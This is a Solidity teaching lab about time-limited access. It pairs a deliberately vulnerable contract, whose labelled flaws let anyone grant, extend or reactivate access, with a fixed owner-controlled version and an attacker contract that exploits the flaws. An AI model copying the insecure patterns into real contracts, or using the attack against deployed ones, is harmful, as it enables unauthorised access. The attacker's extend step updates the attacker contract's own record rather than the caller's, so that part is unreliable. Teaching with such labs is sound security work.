// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * SMART CONTRACT LAB: "Effective Period"
 *
 * 1. EffectivePeriodInsecure (vulnerable)
 * 2. EffectivePeriodSecure   (fixed + defended)
 * 3. EffectivePeriodAttacker (abuses the insecure version)
 *
 * Concept:
 *   Users have access that is valid only between startTime → endTime
 *   (the "effective period").
 *
 * Insecure version lets attackers:
 *   - Grant themselves access
 *   - Extend end time to "infinite"
 *   - Force active flag back to true
 */

/*//////////////////////////////////////////////////////////////
//                INSECURE / VULNERABLE VERSION
//////////////////////////////////////////////////////////////*/

contract EffectivePeriodInsecure {
    struct Access {
        uint256 startTime;   // activation time
        uint256 endTime;     // expiration
        bool active;
        address owner;
    }

    mapping(address => Access) public accessList;

    event AccessGranted(address indexed user, uint256 start, uint256 end);
    event AccessUpdated(address indexed user, uint256 newEnd);
    event ActiveStatusForced(address indexed user, bool status);

    /**
     * ⚠️ VULN #1: Anyone can grant access to anyone, arbitrary times.
     */
    function grantAccess(
        address user,
        uint256 startTime,
        uint256 endTime
    ) external {
        accessList[user] = Access({
            startTime: startTime,
            endTime: endTime,
            active: true,
            owner: user
        });

        emit AccessGranted(user, startTime, endTime);
    }

    /**
     * ⚠️ VULN #2: Anyone can extend their own period to any value.
     */
    function extendPeriod(uint256 newEnd) external {
        accessList[msg.sender].endTime = newEnd;
        emit AccessUpdated(msg.sender, newEnd);
    }

    /**
     * ⚠️ VULN #3: Anyone can toggle any user's active flag.
     */
    function forceActive(address user, bool status) external {
        accessList[user].active = status;
        emit ActiveStatusForced(user, status);
    }

    /**
     * ⚠️ VULN #4: Relies on untrusted timestamps, no extra checks.
     */
    function isValid(address user) external view returns (bool) {
        Access memory a = accessList[user];
        if (!a.active) return false;
        return block.timestamp >= a.startTime && block.timestamp <= a.endTime;
    }
}

/*//////////////////////////////////////////////////////////////
//                       OWNABLE UTIL
//////////////////////////////////////////////////////////////*/

contract Ownable {
    address public owner;

    event OwnershipTransferred(address indexed oldOwner, address indexed newOwner);

    constructor() {
        owner = msg.sender;
        emit OwnershipTransferred(address(0), owner);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "NOT_OWNER");
        _;
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "ZERO_ADDRESS");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
}

/*//////////////////////////////////////////////////////////////
//                       SECURE VERSION
//////////////////////////////////////////////////////////////*/

contract EffectivePeriodSecure is Ownable {
    struct Access {
        uint256 startTime;
        uint256 endTime;
        bool active;
        address owner;
    }

    // Maximum allowed duration for any access period
    uint256 public maxDuration = 365 days;

    mapping(address => Access) public accessList;

    event AccessGranted(address indexed user, uint256 start, uint256 end);
    event AccessUpdated(address indexed user, uint256 newEnd);
    event AccessRevoked(address indexed user);
    event MaxDurationUpdated(uint256 oldDuration, uint256 newDuration);

    /**
     * Only the owner (admin/service) can grant access.
     */
    function grantAccess(
        address user,
        uint256 duration
    ) external onlyOwner {
        require(user != address(0), "INVALID_USER");
        require(duration > 0 && duration <= maxDuration, "INVALID_DURATION");

        uint256 start = block.timestamp;
        uint256 end = start + duration;

        accessList[user] = Access({
            startTime: start,
            endTime: end,
            active: true,
            owner: user
        });

        emit AccessGranted(user, start, end);
    }

    /**
     * User may extend ONLY their own access, within maxDuration.
     */
    function extendOwnPeriod(uint256 extraDuration) external {
        Access storage a = accessList[msg.sender];
        require(a.owner == msg.sender, "NOT_YOUR_ACCESS");
        require(a.active, "ACCESS_NOT_ACTIVE");
        require(extraDuration > 0, "BAD_DURATION");

        uint256 newEnd = a.endTime + extraDuration;
        require(
            newEnd >= a.endTime,
            "OVERFLOW" // sanity check
        );
        require(
            newEnd - a.startTime <= maxDuration,
            "EXCEEDS_MAX_DURATION"
        );

        a.endTime = newEnd;

        emit AccessUpdated(msg.sender, newEnd);
    }

    /**
     * Only admin can revoke access.
     */
    function revoke(address user) external onlyOwner {
        Access storage a = accessList[user];
        require(a.owner != address(0), "NO_ACCESS");
        a.active = false;
        emit AccessRevoked(user);
    }

    /**
     * Owner can tighten or relax maxDuration, within sensible bounds.
     */
    function setMaxDuration(uint256 newDuration) external onlyOwner {
        require(newDuration > 0 && newDuration <= 3 * 365 days, "BAD_MAX");
        uint256 old = maxDuration;
        maxDuration = newDuration;
        emit MaxDurationUpdated(old, newDuration);
    }

    /**
     * Proper validation logic for effective period.
     */
    function isValid(address user) external view returns (bool) {
        Access memory a = accessList[user];
        if (!a.active) return false;
        if (a.owner == address(0)) return false;
        return block.timestamp >= a.startTime && block.timestamp <= a.endTime;
    }
}

/*//////////////////////////////////////////////////////////////
//                         ATTACKER
//////////////////////////////////////////////////////////////*/

contract EffectivePeriodAttacker {
    EffectivePeriodInsecure public target;

    constructor(address _target) {
        target = EffectivePeriodInsecure(_target);
    }

    /**
     * Step 1: Grant self absurd access period.
     */
    function attackGrant() public {
        // Grant access to msg.sender with a huge time window
        target.grantAccess(
            msg.sender,
            1,                      // fake start time
            type(uint256).max - 1   // near-maximum end time
        );
    }

    /**
     * Step 2: Extend endTime to full uint256 max.
     */
    function attackExtend() public {
        target.extendPeriod(type(uint256).max);
    }

    /**
     * Step 3: Force active flag to true.
     */
    function attackForceActive() public {
        target.forceActive(msg.sender, true);
    }

    /**
     * Shortcut: perform full attack sequence.
     */
    function fullAttack() external {
        attackGrant();
        attackExtend();
        attackForceActive();
    }
}
